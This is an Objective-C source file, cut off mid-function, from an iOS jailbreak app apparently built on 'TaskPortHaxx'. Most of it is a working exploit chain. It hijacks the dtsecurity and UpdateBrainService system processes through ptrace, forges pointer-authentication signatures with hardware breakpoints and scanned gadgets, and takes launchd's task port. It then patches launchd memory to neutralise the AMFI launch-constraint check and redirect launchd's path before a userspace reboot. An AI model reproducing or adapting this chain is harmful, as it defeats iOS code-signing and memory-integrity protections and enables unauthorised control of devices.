#include "common.h"
#include "taskporthaxx.h"
#include "credits.h"
#include "bootstrap.h"
#include "AppInfo.h"
#include "AppDelegate.h"
#import "ViewController.h"
#include "AppViewController.h"
#include "NSUserDefaults+appDefaults.h"
#import "Bootstrap-Swift.h"
#import <sys/sysctl.h>
#include <sys/utsname.h>
#include "ProcessContext.h"
#import <IOKit/IOKitLib.h>
#include <Security/SecKey.h>
#include <Security/Security.h>
typedef struct CF_BRIDGED_TYPE(id) __SecCode const* SecStaticCodeRef; /* code on disk */
typedef enum { kSecCSDefaultFlags=0, kSecCSSigningInformation = 1 << 1 } SecCSFlags;
OSStatus SecStaticCodeCreateWithPathAndAttributes(CFURLRef path, SecCSFlags flags, CFDictionaryRef attributes, SecStaticCodeRef* CF_RETURNS_RETAINED staticCode);
OSStatus SecCodeCopySigningInformation(SecStaticCodeRef code, SecCSFlags flags, CFDictionaryRef* __nonnull CF_RETURNS_RETAINED information);

mach_port_t dtsecurityTaskPort = MACH_PORT_NULL;
@import MachO;
@import Darwin;
NSDictionary *getLaunchdStringOffsets(void) {
    NSMutableDictionary *dict = [NSMutableDictionary dictionary];
    
    char *path = "/sbin/launchd";
    int fd = open(path, O_RDONLY);
    struct stat s;
    fstat(fd, &s);
    const struct mach_header_64 *map = mmap(NULL, s.st_size, PROT_READ, MAP_SHARED, fd, 0);
    assert(map != MAP_FAILED);
    
    size_t size = 0;
    char *cstring = (char *)getsectiondata(map, SEG_TEXT, "__cstring", &size);
    assert(cstring);
    while (size > 0) {
        dict[@(cstring)] = @(cstring - (char *)map);
        uint64_t off = strlen(cstring) + 1;
        cstring += off;
        size -= off;
    }
    
    munmap((void *)map, s.st_size);
    close(fd);
    return dict;
}


@interface ViewController ()
@property(nonatomic) mach_port_t fakeBootstrapPort;
@property(nonatomic) ProcessContext *dtProc;
@property(nonatomic) ProcessContext *ubProc;
@end

BOOL gTweakEnabled=YES;

@implementation ViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    // Do any additional setup after loading the view.
    
    UIViewController *vc = [SwiftUIViewWrapper createSwiftUIView];
    
    UIView *swiftuiView = vc.view;
    swiftuiView.translatesAutoresizingMaskIntoConstraints = NO;
    
    [self addChildViewController:vc];
    [self.view addSubview:swiftuiView];
    
    [NSLayoutConstraint activateConstraints:@[
        [swiftuiView.leadingAnchor constraintEqualToAnchor:self.view.leadingAnchor],
        [swiftuiView.trailingAnchor constraintEqualToAnchor:self.view.trailingAnchor],
        [swiftuiView.topAnchor constraintEqualToAnchor:self.view.topAnchor],
        [swiftuiView.bottomAnchor constraintEqualToAnchor:self.view.bottomAnchor],
    ]];
    
    [vc didMoveToParentViewController:self];
    
// load trust cache if available. though this is only loaded once per boot we check it again
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        if(spawn_stage1_prepare_process() != 0) return;
        
        NSString *assetDir = [NSFileManager.defaultManager URLsForDirectory:NSDocumentDirectory inDomains:NSUserDomainMask].lastObject.path;
        NSString *tcPath = [assetDir stringByAppendingPathComponent:@"AssetData/.TrustCache"];
        if(load_trust_cache(tcPath) == 0) {
            printf("Trust cache loaded.\n");
        } else {
            printf("Failed to load trust cache.\n");
        }
        
        // preflight UpdateBrainService
        [self.ubProc spawnProcess:@"updatebrain" suspended:NO];
        printf("Spawned UpdateBrainService with PID %d\n", self.ubProc.pid);
        
    });
    // find launchd string offsets
    NSUserDefaults *defaults = NSUserDefaults.standardUserDefaults;
        NSDictionary *offsets = getLaunchdStringOffsets();
        defaults.offsetLaunchdPath = [offsets[@"/sbin/launchd"] unsignedLongValue];
        // AMFI is only needed for iOS 17.0 to bypass launch constraint
        defaults.offsetAMFI = [offsets[@"AMFI"] unsignedLongValue];
        NSLog(@"Found launchd path string offset: 0x%lx\n", defaults.offsetLaunchdPath);
        if (defaults.offsetAMFI) {
            NSLog(@"Found AMFI string offset: 0x%lx\n", defaults.offsetAMFI);
        }

    
    self.fakeBootstrapPort = setup_fake_bootstrap_server();
    self.dtProc = [[ProcessContext alloc] initWithExceptionPortName:@"com.kdt.taskporthaxx.dtsecurity_donor_exception_server"];
    self.ubProc = [[ProcessContext alloc] initWithExceptionPortName:@"com.kdt.taskporthaxx.updatebrain_exception_server"];
    
    // TODO: save offsets
    // unauthenticated br x8 gadget
    void *handle = dlopen("/usr/lib/swift/libswiftDistributed.dylib", RTLD_GLOBAL);
    assert(handle != NULL);
    uint32_t *func = (uint32_t *)dlsym(RTLD_DEFAULT, "swift_distributed_execute_target");
    assert(func != NULL);
    for (; *func != 0xd61f0100; func++) {}
    brX8Address = (uint64_t)func;
    printf("Found br x8 at address: 0x%016lx\n", brX8Address);
    // if br x8 != saved address, clear saved address
    uint64_t savedPpointer = NSUserDefaults.standardUserDefaults.signedPointer;
    if (savedPpointer != 0 && (brX8Address&0xFFFFFFFFF) != (savedPpointer&0xFFFFFFFFF)) {
        printf("br x8 address changed, clearing saved signed pointer\n");
        NSUserDefaults.standardUserDefaults.signedPointer = 0;
        NSUserDefaults.standardUserDefaults.signedDiversifier = 0;
    }
    
    // PAC signing gadget
    func = (uint32_t *)zeroify_scalable_zone;
    for (; func[0] != 0xdac10230 || func[1] != 0xf9000110; func++) {}
    paciaAddress = (uint64_t)func;
    printf("Found pacia x16, x17 at address: 0x%016lx\n", paciaAddress);
    
    // change LR gadget
    func = (uint32_t *)dispatch_debug;
    for (; func[0] != 0xaa0103fe || func[1] != 0xf9402008; func++) {}
    changeLRAddress = (uint64_t)func;
    }

- (void)loadTrustCacheTapped {
    // Download arm64 XPC service from Apple which we will use to initiate PAC bypass
    char *path = "/var/mobile/.TrustCache";
    int fd = open(path, O_RDONLY);
    struct stat s;
    fstat(fd, &s);
    void *map = mmap(NULL, s.st_size, PROT_READ, MAP_SHARED, fd, 0);
    assert(map != MAP_FAILED);
    CFDictionaryRef match = IOServiceMatching("AppleMobileFileIntegrity");
    io_service_t svc = IOServiceGetMatchingService(0, match);
    io_connect_t conn;
    IOServiceOpen(svc, mach_task_self_, 0, &conn);
    kern_return_t kr = IOConnectCallMethod(conn, 2, NULL, 0, map, s.st_size, NULL, NULL, NULL, NULL);
    if (kr != KERN_SUCCESS) {
        printf("IOConnectCallMethod failed: %s\n", mach_error_string(kr));
    } else {
        printf("Successfully loaded trust cache from %s\n", path);
    }
    IOServiceClose(conn);
    IOObjectRelease(svc);
    munmap((void *)map, s.st_size);
    close(fd);
}

uint64_t getDyldPACIAOffset(uint64_t _dyld_start) {
    // w4ever
    void *handle = dlopen("/usr/lib/dyld", RTLD_GLOBAL);
    uint32_t *func = (uint32_t *)dlsym(RTLD_DEFAULT, "_dyld_start");
    uint32_t *dyld_start_func = func;
    // 1. find where `B start`
    for (; (*func & 0xFC000000) != 0x14000000;/* b */ func++) {}
    // printf("B start: %p\n", func);
    // 2. obtain offset where branch
    uint32_t imm26 = *func & 0x3ffffff;
    int32_t off = (int32_t)(imm26 << 2);
    if (imm26 & (1<<25)) off |= 0xFC000000;
    // printf("off: %d\n", off);
    func += off/sizeof(*func);
    // printf("start: %p\n", func);
    // 3. find pacia x16, x8
    for (; (*func & 0xFFFFFFFF) != 0xDAC10110;/* pacia x16, x8 */ func++) {}
    // printf("pacia x16, x8 in start: %p\n", func);
    off = (uint32_t)dyld_start_func - (uint32_t)func;
    uint64_t pacia_inst = _dyld_start - off;
    return pacia_inst;
}

- (void)performBypassPAC {
    kern_return_t kr;
    vm_size_t page_size = getpagesize();
    
    [self.dtProc spawnProcess:@"dtsecurity" suspended:YES];
    printf("Spawned dtsecurity with PID %d\n", self.dtProc.pid);
    
    // attach to dtsecurity
    kr = (int)RemoteArbCall(self.ubProc, ptrace, PT_ATTACHEXC, self.dtProc.pid, 0, 0);
    printf("ptrace(PT_ATTACHEXC) returned %d\n", kr);
    kr = (int)RemoteArbCall(self.ubProc, ptrace, PT_CONTINUE, self.dtProc.pid, 1, 0);
    printf("ptrace(PT_CONTINUE) returned %d\n", kr);
    
    while (!self.dtProc.newState) {
#warning TODO: maybe another semaphore
        usleep(200000);
    }
    dtsecurityTaskPort = self.dtProc.taskPort;
    //bootstrap_register(bootstrap_port, "com.kdt.taskporthaxx.dtsecurity_task_port", dtsecurityTaskPort);
    if(!dtsecurityTaskPort) {
        printf("dtsecurity task port is null?\n");
        return;
    }
    
    // create a region which holds temp data
    vm_address_t map = RemoteArbCall(self.ubProc, mmap, 0, page_size, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
    if (!map) {
        printf("Failed to call mmap\n");
        return;
    }
    
    // Pass dtsecurity task port to UpdateBrainService
    RemoteArbCall(self.ubProc, task_get_special_port, 0x203, TASK_BOOTSTRAP_PORT, map);
    mach_port_t remote_bootstrap_port = [self.ubProc read32:map];
    vm_address_t xpc_bootstrap_pipe = RemoteArbCall(self.ubProc, xpc_pipe_create_from_port, remote_bootstrap_port, 0, map);
    printf("xpc_bootstrap_pipe: 0x%lx\n", xpc_bootstrap_pipe);
    vm_address_t dict = RemoteArbCall(self.ubProc, xpc_dictionary_create_empty);
    vm_address_t keyStr = [self.ubProc writeString:map+0x10 string:"name"];
    vm_address_t valueStr = [self.ubProc writeString:map+0x20 string:"port"];
    RemoteArbCall(self.ubProc, xpc_dictionary_set_string, dict, keyStr, valueStr);
    RemoteArbCall(self.ubProc, _xpc_pipe_interface_routine, xpc_bootstrap_pipe, 0xcf, dict, map, 0);
    vm_address_t reply = [self.ubProc read64:map];
    mach_port_t dtsecurity_task = (mach_port_t)RemoteArbCall(self.ubProc, xpc_dictionary_copy_mach_send, reply, valueStr);
    if (!dtsecurity_task) {
        printf("Failed to get dtsecurity task port from UpdateBrainService\n");
        return;
    }
    printf("Got dtsecurity task port from UpdateBrainService: 0x%x\n", dtsecurity_task);
    
    // Get dtsecurity thread port
    vm_address_t threads = map + 0x10;
    vm_address_t thread_count = map;
    [self.ubProc write32:thread_count value:TASK_BASIC_INFO_64_COUNT];
    kr = (kern_return_t)RemoteArbCall(self.ubProc, task_threads, dtsecurity_task, threads, thread_count);
    if (kr != KERN_SUCCESS) {
        printf("task_threads failed: %s\n", mach_error_string(kr));
        return;
    }
    threads = [self.ubProc read64:threads];
    thread_t dtsecurity_thread = (thread_t)[self.ubProc read32:threads];
    printf("dtsecurity thread port: 0x%x\n", dtsecurity_thread);
    
    // Get dtsecurity debug state
    arm_debug_state64_t *debug_state = (arm_debug_state64_t *)(map + 0x10);
    vm_address_t debug_state_count = map;
    [self.ubProc write32:debug_state_count value:ARM_DEBUG_STATE64_COUNT];
    kr = (kern_return_t)RemoteArbCall(self.ubProc, thread_get_state, dtsecurity_thread, ARM_DEBUG_STATE64, (uint64_t)debug_state, debug_state_count);
    if (kr != KERN_SUCCESS) {
        printf("thread_get_state(ARM_DEBUG_STATE64) failed: %s\n", mach_error_string(kr));
        return;
    }
    
    // Set hardware breakpoint 1 to pacia instruction
    uint64_t _dyld_start = self.dtProc.newState->__pc;
    xpaci(_dyld_start);
    uint64_t pacia_inst = getDyldPACIAOffset(_dyld_start);
    printf("_dyld_start: 0x%llx\n", _dyld_start);
    printf("pacia: 0x%llx\n", pacia_inst);
    [self.ubProc write64:(uint64_t)&debug_state->__bvr[0] value:pacia_inst];
    [self.ubProc write64:(uint64_t)&debug_state->__bcr[0] value:0x1e5];
    kr = (kern_return_t)RemoteArbCall(self.ubProc, thread_set_state, dtsecurity_thread, ARM_DEBUG_STATE64, (uint64_t)debug_state, ARM_DEBUG_STATE64_COUNT);
    if (kr != KERN_SUCCESS) {
        printf("thread_set_state(ARM_DEBUG_STATE64) failed: %s\n", mach_error_string(kr));
        return;
    }
    
    printf("Bypassing PAC right now\n");
    
    // Clear SIGTRAP
    kr = (int)RemoteArbCall(self.ubProc, ptrace, PT_THUPDATE, self.dtProc.pid, dtsecurity_thread, 0);
    RemoteArbCall(self.ubProc, kill, self.dtProc.pid, SIGCONT);
    self.dtProc.expectedLR = 0;
    [self.dtProc resume];
    printf("Resume1:\n");
    printf("PC: 0x%llx\n", self.dtProc.newState->__pc);
    
    // This shall step to pacia instruction
    self.dtProc.expectedLR = (uint64_t)-1;
    [self.dtProc resume];
    printf("Resume2:\n");
    printf("PC: 0x%llx\n", self.dtProc.newState->__pc);
    
    uint64_t currPC = self.dtProc.newState->__pc;
    xpaci(currPC);
    if (currPC != pacia_inst) {
        printf("Did not hit pacia breakpoint?\n");
        return;
    }
    
    printf("We hit PACIA breakpoint!\n");
    self.dtProc.newState->__x[16] = brX8Address;
    self.dtProc.newState->__x[8] = 0x74810000AA000000; // 'pc' discriminator, 0xAA diversifier
    
    // Move our hardware breakpoint to the next instruction after pacia
    // TODO: maybe single step instead?
    [self.ubProc write64:(uint64_t)&debug_state->__bvr[0] value:pacia_inst+4];
    [self.ubProc write64:(uint64_t)&debug_state->__bcr[0] value:0x1e5];
    kr = (kern_return_t)RemoteArbCall(self.ubProc, thread_set_state, dtsecurity_thread, ARM_DEBUG_STATE64, (uint64_t)debug_state, ARM_DEBUG_STATE64_COUNT);
    if (kr != KERN_SUCCESS) {
        printf("thread_set_state(ARM_DEBUG_STATE64) failed: %s\n", mach_error_string(kr));
        return;
    }
    
    [self.dtProc resume];
    printf("Resume3:\n");
    printf("PC: 0x%llx\n", self.dtProc.newState->__pc);
    
    brX8Address = self.dtProc.newState->__x[16];
    printf("Signed Pointer: 0x%lx\n", brX8Address);
    
    // At this point we have corrupted x16 and x8 to sign br x8 gadget, it's quite complicated
    // to continue from here as we need to have a signed pacia beforehand, then sign br x8 and
    // set registers back to repair. Instead we will kill and replace dtsecurity.
    printf("Cleaning up after PAC bypass\n");
    RemoteArbCall(self.ubProc, ptrace, PT_KILL, self.dtProc.pid);
    RemoteArbCall(self.ubProc, kill, self.dtProc.pid, SIGKILL);
    [self.dtProc terminate];
    [self.ubProc terminate];
    self.ubProc = nil;
}

#define RemoteRead32(addr) [self.dtProc read32:addr]
#define RemoteRead64(addr) [self.dtProc read64:addr]
#define RemoteWrite32(addr, value_) [self.dtProc write32:addr value:value_]
#define RemoteWrite64(addr, value_) [self.dtProc write64:addr value:value_]
- (void)arbCallButtonTapped
{
    [self arbCallButtonTappedFromSwiftUI];
}

- (void)arbCallButtonTappedFromSwiftUI
{
    
dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        if (*(uint32_t *)getpagesize == 0xd503237f) {
            // we know this is arm64e hardware if some function starts with pacibsp
            [self performBypassPAC];
        }
        
        kern_return_t kr;
        vm_size_t page_size = getpagesize();
        
        self.dtProc = [[ProcessContext alloc] initWithExceptionPortName:@"com.kdt.taskporthaxx.dtsecurity_exception_server"];
        [self.dtProc spawnProcess:@"dtsecurity" suspended:NO];
        printf("Spawned dtsecurity with PID %d\n", self.dtProc.pid);
        
        // Change LR
        while (!self.dtProc.newState) {
#warning TODO: maybe another semaphore
            usleep(200000);
        }
        self.dtProc.newState->__lr = 0xFFFFFF00;
        self.dtProc.newState->__flags &= ~(__DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_LR |
                                           __DARWIN_ARM_THREAD_STATE64_FLAGS_IB_SIGNED_LR |
                                           __DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_PC);
        
        // Create a region which holds temp data (should we use stack instead?)
        vm_address_t map = RemoteArbCall(self.dtProc, mmap, 0, page_size, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
        if (!map) {
            printf("Failed to call mmap. Please try resetting pointer and try again\n");
            return;
        }
        printf("Mapped memory at 0x%lx\n", map);
        
        // Test mkdir
//        RemoteWriteString(map, "/tmp/.it_works");
//        RemoteArbCall(self.dtProc, mkdir, map, 0700);
        
        // Get my task port
        mach_port_t dtsecurity_task = (mach_port_t)RemoteArbCall(self.dtProc, task_self_trap);
//        kr = (kern_return_t)RemoteArbCall(self.dtProc, task_for_pid, dtsecurity_task, getpid(), map);
//        if (kr != KERN_SUCCESS) {
//            printf("Failed to get my task port\n");
//            return;
//        }
//        mach_port_t my_task = (mach_port_t)RemoteRead32(map);
        // Map the page we allocated in dtsecurity to this process
//        kr = (kern_return_t)RemoteArbCall(self.dtProc, vm_remap, my_task, map, page_size, 0, VM_FLAGS_ANYWHERE, dtsecurity_task, map, false, map+8, map+12, VM_INHERIT_SHARE);
//        if (kr != KERN_SUCCESS) {
//            printf("Failed to create dtsecurity<->haxx shared mapping\n");
//            return;
//        }
//        vm_address_t local_map = RemoteRead64(map);
//        printf("Created shared mapping: 0x%lx\n", local_map);
//        printf("read: 0x%llx\n", *(uint64_t *)local_map);
        
        // Get dtsecurity dyld base for blr x19
        RemoteWrite32((uint64_t)map, TASK_DYLD_INFO_COUNT);
         kr = (kern_return_t)RemoteArbCall(self.dtProc, task_info, dtsecurity_task, TASK_DYLD_INFO, map + 8, map);
        if (kr != KERN_SUCCESS) {
            printf("task_info failed\n");
            return;
        }
        struct dyld_all_image_infos *remote_dyld_all_image_infos_addr = (void *)(RemoteRead64(map + 8) + offsetof(struct task_dyld_info, all_image_info_addr));
        vm_address_t remote_dyld_base;
        do {
            remote_dyld_base = RemoteRead64((uint64_t)&remote_dyld_all_image_infos_addr->dyldImageLoadAddress);
            // FIXME: why do I have to sleep a bit for dyld base to be available?
            usleep(100000);
        } while (remote_dyld_base == 0);
        printf("dtsecurity dyld base: 0x%lx\n", remote_dyld_base);
        
        // Get launchd task port
        kr = (kern_return_t)RemoteArbCall(self.dtProc, task_for_pid, dtsecurity_task, 1, map);
        if (kr != KERN_SUCCESS) {
            printf("Failed to get launchd task port\n");
            return;
        }
        
        mach_port_t launchd_task = (mach_port_t)RemoteRead32(map);
        printf("Got launchd task port: %d\n", launchd_task);
        
        // Get remote dyld base
        RemoteWrite32((uint64_t)map, TASK_DYLD_INFO_COUNT);
        kr = (kern_return_t)RemoteArbCall(self.dtProc, task_info, launchd_task, TASK_DYLD_INFO, map + 8, map);
        if (kr != KERN_SUCCESS) {
            printf("task_info failed\n");
            return;
        }
        remote_dyld_all_image_infos_addr = (void *)(RemoteRead64(map + 8) + offsetof(struct task_dyld_info, all_image_info_addr));
        printf("launchd dyld_all_image_infos_addr: %p\n", remote_dyld_all_image_infos_addr);
        
        // uint32_t infoArrayCount = &remote_dyld_all_image_infos_addr->infoArrayCount;
        kr = (kern_return_t)RemoteArbCall(self.dtProc, vm_read_overwrite, launchd_task, (mach_vm_address_t)&remote_dyld_all_image_infos_addr->infoArrayCount, sizeof(uint32_t), map, map + 8);
        if (kr != KERN_SUCCESS) {
            printf("vm_read_overwrite _dyld_all_image_infos->infoArrayCount failed\n");
            return;
        }
        uint32_t infoArrayCount = RemoteRead32(map);
        printf("launchd infoArrayCount: %u\n", infoArrayCount);
        
        //const struct dyld_image_info* infoArray = &remote_dyld_all_image_infos_addr->infoArray;
        kr = (kern_return_t)RemoteArbCall(self.dtProc, vm_read_overwrite, launchd_task, (mach_vm_address_t)&remote_dyld_all_image_infos_addr->infoArray, sizeof(uint64_t), map, map + 8);
        if (kr != KERN_SUCCESS) {
            printf("vm_read_overwrite _dyld_all_image_infos->infoArray failed\n");
            return;
        }
        
        // Enumerate images to find launchd base
        vm_address_t launchd_base = 0;
        vm_address_t infoArray = RemoteRead64(map);
        for (int i = 0; i < infoArrayCount; i++) {
            kr = (kern_return_t)RemoteArbCall(self.dtProc, vm_read_overwrite, launchd_task, infoArray + sizeof(uint64_t[i*3]), sizeof(uint64_t), map, map + 8);
            uint64_t base = RemoteRead64(map);
            if (base % page_size) {
                // skip unaligned entries, as they are likely in dsc
                continue;
            }
            printf("Image[%d] = 0x%llx\n", i, base);
            // read magic, cputype, cpusubtype, filetype
            kr = (kern_return_t)RemoteArbCall(self.dtProc, vm_read_overwrite, launchd_task, base, 16, map, map + 16);
            uint64_t magic = RemoteRead32(map);
            if (magic != MH_MAGIC_64) {
                printf("not a mach-o (magic: 0x%x)\n", (uint32_t)magic);
                continue;
            }
            uint32_t filetype = RemoteRead32(map + 12);
            if (filetype == MH_EXECUTE) {
                printf("found launchd executable at 0x%llx\n", base);
                launchd_base = base;
                break;
            }
        }
        
        // Reprotect rw
        // minimum page = 0x5f000;
        vm_offset_t launchd_str_off = NSUserDefaults.standardUserDefaults.offsetLaunchdPath;
        vm_offset_t amfi_str_off = NSUserDefaults.standardUserDefaults.offsetAMFI;
        
        printf("reprotecting 0x%lx\n", launchd_base + launchd_str_off);
        if (amfi_str_off){
          printf("amfi string offset: 0x%lx\n", launchd_base + amfi_str_off);
        self.dtProc.lr = 0xFFFFFF00; // fix autibsp
        kr = (kern_return_t)RemoteArbCall(self.dtProc, vm_protect, launchd_task, launchd_base + amfi_str_off, 0x20, false, PROT_READ | PROT_WRITE | VM_PROT_COPY);
        if (kr != KERN_SUCCESS) {
            printf("vm_protect failed: kr = %s\n", mach_error_string(kr));
            sleep(5);
            return;
        }
        }
        // w4ever
        // kr = (kern_return_t)RemoteArbCall(self.dtProc, vm_protect, launchd_task, launchd_base + launchd_str_off & ~PAGE_MASK, 0x8000, false, PROT_READ | PROT_WRITE | VM_PROT_COPY);

        self.dtProc.lr = 0xFFFFFF00; // fix autibsp
        kr = (kern_return_t)RemoteArbCall(self.dtProc, vm_protect, launchd_task, launchd_base + launchd_str_off, 0x20, false, PROT_READ | PROT_WRITE | VM_PROT_COPY);
        if (kr != KERN_SUCCESS) {
            printf("vm_protect failed: kr = %s\n", mach_error_string(kr));
            sleep(5);
            return;
        }
        
        // https://github.com/wh1te4ever/TaskPortHaxxApp/commit/327022fe73089f366dcf1d0d75012e6288916b29
        // Bypass panic by launch constraints
        // Method 2: Patch `AMFI` string that being used as _amfi_launch_constraint_set_spawnattr's arguments

        // Patch string `AMFI`
        if (amfi_str_off) {
        printf("amfi patch");
        const char *newStr = "AAAA\x00";
        [self.dtProc writeString:map string:newStr];
        self.dtProc.lr = 0xFFFFFF00; // fix autibsp
        kr = (kern_return_t)RemoteArbCall(self.dtProc, vm_write, launchd_task, launchd_base + amfi_str_off, map, 5);
        if (kr != KERN_SUCCESS) {
            printf("vm_write failed\n");
            sleep(5);
            return;
        }
        [self.dtProc taskHexDump:launchd_base + amfi_str_off size:0x100 task:(mach_port_t)launchd_task map:(uint64_t)map];
        }
        // Overwrite /sbin/launchd string to /var/.launchd
        // const char *newPath = jbroot(@"/sbin/launchd").UTF8String;
        const char *newPath = launchdPath().UTF8String;
        // const char *newPath = "/var/.launchd";
        [self.dtProc writeString:map string:newPath];
        self.dtProc.lr = 0xFFFFFF00; // fix autibsp
        kr = (kern_return_t)RemoteArbCall(self.dtProc, vm_write, launchd_task, launchd_base + launchd_str_off, map, strlen(newPath));
        if (kr != KERN_SUCCESS) {
            printf("vm_write failed\n");
            sleep(5);
            return;
        }
        printf("Successfully overwrote launchd executable path string to %s\n", newPath);
        sleep(5);
        userspaceReboot();
        //RemoteArbCall(self.dtProc, exit, 0);

    });
}
BOOL updateOpensshStatus(BOOL notify)
{
    BOOL status;
    
    if(isSystemBootstrapped()) {
        status = spawnRoot(jbroot(@"/basebin/bootstrapd"), @[@"openssh",@"check"], nil, nil)==0;
    } else {
        status = [NSUserDefaults.appDefaults boolForKey:@"openssh"];
    }
    
    if(notify) [NSNotificationCenter.defaultCenter postNotificationName:@"opensshStatusNotification" object:@(status)];
    
    return status;
}

BOOL checkServer()
{
    static bool alerted = false;
    if(alerted) return NO;

    BOOL ret=NO;

    if(spawnRoot(jbroot(@"/basebin/bootstrapd"), @[@"check"], nil, nil) != 0)
    {
        ret = NO;
        alerted = true;

        UIAlertController *alert = [UIAlertController alertControllerWithTitle:Localized(@"Server Not Running") message:Localized(@"for unknown reasons the bootstrap server is not running, the only thing we can do is to restart it now.") preferredStyle:UIAlertControllerStyleAlert];
        [alert addAction:[UIAlertAction actionWithTitle:Localized(@"Restart Server") style:UIAlertActionStyleDefault handler:^(UIAlertAction *action){

            alerted = false;

            NSString* log=nil;
            NSString* err=nil;
            if(spawnRoot(jbroot(@"/basebin/bootstrapd"), @[@"daemon",@"-f"], &log, &err)==0) {
                [AppDelegate addLogText:Localized(@"bootstrap server restart successful")];
            } else {
                [AppDelegate showMesage:[NSString stringWithFormat:@"%@\nERR:%@"] title:Localized(@"Error")];
            }
        }]];

        [AppDelegate showAlert:alert];
    } else {
        ret = YES;
    }
    
    updateOpensshStatus(YES);
    return ret;
}


#define PROC_PIDPATHINFO_MAXSIZE  (1024)
int proc_pidpath(pid_t pid, void *buffer, uint32_t buffersize);
NSString* getLaunchdPath()
{
    char pathbuf[PROC_PIDPATHINFO_MAXSIZE] = {0};
    ASSERT(proc_pidpath(1, pathbuf, sizeof(pathbuf)) > 0);
    return @(pathbuf);
}

void initFromSwiftUI()
{
    BOOL IconCacheRebuilding=NO;

    if(isSystemBootstrapped())
    {
        if([NSFileManager.defaultManager fileExistsAtPath:jbroot(@"/basebin/.rebuildiconcache")]) {
            [NSFileManager.defaultManager removeItemAtPath:jbroot(@"/basebin/.rebuildiconcache") error:nil];
            [AppDelegate showHudMsg:Localized(@"Rebuilding") detail:Localized(@"Don't exit Bootstrap app until show the lock screen")];
            IconCacheRebuilding = YES;
        }
    }

    [AppDelegate addLogText:[NSString stringWithFormat:Localized(@"ios-version: %@"),UIDevice.currentDevice.systemVersion]];

    struct utsname systemInfo;
    uname(&systemInfo);
    [AppDelegate addLogText:[NSString stringWithFormat:Localized(@"device-model: %s"),systemInfo.machine]];

    [AppDelegate addLogText:[NSString stringWithFormat:Localized(@"app-version: %@"),NSBundle.mainBundle.infoDictionary[@"CFBundleShortVersionString"]]];

    [AppDelegate addLogText:[NSString stringWithFormat:Localized(@"boot-session: %@"),getBootSession()]];

    [AppDelegate addLogText: isBootstrapInstalled()? Localized(@"bootstrap installed"):Localized(@"bootstrap not installed")];
    [AppDelegate addLogText: isSystemBootstrapped()? Localized(@"system bootstrapped"):Localized(@"system not bootstrapped")];

    SYSLOG("locale=%@", NSLocale.currentLocale.countryCode);
    SYSLOG("locale=%@", [NSUserDefaults.appDefaults valueForKey:@"locale"]);
    [NSUserDefaults.appDefaults setValue:NSLocale.currentLocale.countryCode forKey:@"locale"];
    [NSUserDefaults.appDefaults synchronize];
    SYSLOG("locale=%@", [NSUserDefaults.appDefaults valueForKey:@"locale"]);

    if(isSystemBootstrapped())
    {
        if(checkServer()) {
            [AppDelegate addLogText:Localized(@"bootstrap server check successful")];
            
            if(isAllCTBugAppsHidden()) {
                UIAlertController *alert = [UIAlertController alertControllerWithTitle:Localized(@"Jailbreak Apps is Hidden") message:Localized(@"Do you want to restore them now?") preferredStyle:UIAlertControllerStyleAlert];
                [alert addAction:[UIAlertAction actionWithTitle:Localized(@"NO") style:UIAlertActionStyleCancel handler:nil]];
                [alert addAction:[UIAlertAction actionWithTitle:Localized(@"YES") style:UIAlertActionStyleDefault handler:^(UIAlertAction *action){
                    unhideAllCTBugApps();
                }]];
                [AppDelegate showAlert:alert];
            }
        }

        [[NSNotificationCenter defaultCenter] addObserverForName:UIApplicationWillEnterForegroundNotification object:nil queue:nil usingBlock:^(NSNotification * _Nonnull note) {
            if(isSystemBootstrapped()) checkServer();
        }];
    }

    if(!IconCacheRebuilding && isBootstrapInstalled() && !isSystemBootstrapped()) {
        if([UIApplication.sharedApplication canOpenURL:[NSURL URLWithString:@"filza://"]]
           || [LSPlugInKitProxy pluginKitProxyForIdentifier:@"com.tigisoftware.Filza.Sharing"])
        {
            [AppDelegate showMesage:Localized(@"It seems that you have the Filza installed in trollstore, which may be detected as jailbroken. You can remove it from trollstore then install Filza from roothide repo in Sileo.") title:Localized(@"Warning")];
        }
    }
}

@end

void setIdleTimerDisabled(BOOL disabled) {
    dispatch_async(dispatch_get_main_queue(), ^{
        [[UIApplication sharedApplication] setIdleTimerDisabled:disabled];
    });
}

BOOL checkTSVersion()
{    
    CFURLRef binaryURL = CFURLCreateWithFileSystemPath(kCFAllocatorDefault, (__bridge CFStringRef)NSBundle.mainBundle.executablePath, kCFURLPOSIXPathStyle, false);
    if(binaryURL == NULL) return NO;
    
    SecStaticCodeRef codeRef = NULL;
    OSStatus result = SecStaticCodeCreateWithPathAndAttributes(binaryURL, kSecCSDefaultFlags, NULL, &codeRef);
    if(result != errSecSuccess) return NO;
        
    CFDictionaryRef signingInfo = NULL;
     result = SecCodeCopySigningInformation(codeRef, kSecCSSigningInformation, &signingInfo);
    if(result != errSecSuccess) return NO;
        
    NSString* teamID = (NSString*)CFDictionaryGetValue(signingInfo, CFSTR("teamid"));
    SYSLOG("teamID in trollstore: %@", teamID);
    
    return [teamID isEqualToString:@"T8ALTGMVXN"];
}

void respringAction()
{
    NSString* log=nil;
    NSString* err=nil;
    int status = spawnBootstrap((char*[]){"/usr/bin/sbreload", NULL}, &log, &err);
    if(status!=0) [AppDelegate showMesage:[NSString stringWithFormat:@"%@\n\nstderr:\n%@",log,err] title:[NSString stringWithFormat:@"code(%d)",status]];
}

void rebuildappsAction()
{
    [AppDelegate addLogText:Localized(@"Status: Rebuilding Apps")];

    dispatch_async(dispatch_get_global_queue(0, 0), ^{
        [AppDelegate showHudMsg:Localized(@"Applying")];
        setIdleTimerDisabled(YES);

        NSString* log=nil;
        NSString* err=nil;
        int status = spawnBootstrap((char*[]){"/bin/sh", "/basebin/rebuildapps.sh", NULL}, nil, nil);
        if(status==0) {
            killAllForExecutable("/usr/libexec/backboardd");
        } else {
            [AppDelegate showMesage:[NSString stringWithFormat:@"%@\n\nstderr:\n%@",log,err] title:[NSString stringWithFormat:@"code(%d)",status]];
        }
        [AppDelegate dismissHud];
        setIdleTimerDisabled(NO);
    });
}

void reinstallPackageManager()
{
    dispatch_async(dispatch_get_global_queue(0, 0), ^{
